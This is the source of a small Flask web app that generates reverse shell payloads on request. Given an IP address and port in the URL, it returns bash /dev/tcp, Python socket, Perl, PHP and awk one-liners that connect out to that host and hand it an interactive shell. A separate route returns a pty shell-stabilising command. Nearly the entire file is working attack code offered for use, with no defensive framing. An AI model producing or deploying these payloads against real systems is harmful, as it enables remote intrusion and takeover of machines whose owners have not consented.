from flask import render_template, Blueprint, request
import ipaddress

# Validate IP Addr.
def valid_ip(address):
	try: 
		print (ipaddress.ip_address(address))
		return True
	except:
		return False

# Validate Port.
def valid_port(port):
	if isinstance(port, int) and port <= 65535:
		return True

# Main index blueprint / route.
index = Blueprint("index", __name__)
@index.route('', methods=['GET'])
def home():
	return render_template('index.html')

# Help page.
@index.route('help', methods=['GET'])
def help():
	return render_template('help.html')

# Bash route.
@index.route('<string:ip>/<int:port>', methods=['GET'])
def bash(ip, port):
	quotes_pref = request.args.get("q", str)

	if valid_ip(ip) == True and valid_port(port) == True:
		bash_payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

		if quotes_pref == "y":
			return f"'{bash_payload}'\n"
		return f"{bash_payload}\n"

	else:
		return "Invalid IP or Port"

# Stabilize shell.
@index.route('stabilise', methods=['GET'])
@index.route('reset', methods=['GET'])
def stabilize():
	py_stabilise_payload = 'pty=__import__(\"pty\");pty.spawn("/bin/bash")'
	return f"python -c '{py_stabilise_payload}'\n"

# Python route.
@index.route('python/<string:ip>/<int:port>', methods=['GET'])
def python(ip, port):
	quotes_pref = request.args.get("q", str)

	if valid_ip(ip) == True and valid_port(port) == True:
		python_payload = f"socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"

		if quotes_pref == "y":
			return f"'{python_payload}'\n"
		return f"{python_payload}\n"

	else:
		return "Invalid IP or Port"

# Perl route.
@index.route('perl/<string:ip>/<int:port>', methods=['GET'])
def perl(ip, port):
	quotes_pref = request.args.get("q", str)

	if valid_ip(ip) == True and valid_port(port) == True:
		ppp1 = f"use Socket;$i=\"{ip}\";$p={port}"
		ppp2 = ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
		perl_payload = ppp1 + ppp2

		if quotes_pref == "y":
			return f"'{perl_payload}'\n"
		return f"{perl_payload}\n"

	else:
		return "Invalid IP or Port"

# PHP route.
@index.route('php/<string:ip>/<int:port>', methods=['GET'])
def php(ip, port):
	quotes_pref = request.args.get("q", str)

	if valid_ip(ip) == True and valid_port(port) == True:
		php_payload = f'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'

		if quotes_pref == "y":
			return f"'{php_payload}'\n"
		return f"{php_payload}\n"

	else:
		return "Invalid IP or Port"

# Awk route.
@index.route('awk/<string:ip>/<int:port>', methods=['GET'])
def awk(ip, port):
	quotes_pref = request.args.get("q", str)

	if valid_ip(ip) == True and valid_port(port) == True:
		app1 = 'BEGIN {s ='
		app2 = f'"/inet/tcp/0/{ip}/{port}";' 
		app3 = 'while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
		awk_payload = app1 + app2 + app3

		if quotes_pref == "y":
			return f"'{awk_payload}'\n"
		return f"{awk_payload}\n"

	else:
		return "Invalid IP or Port"
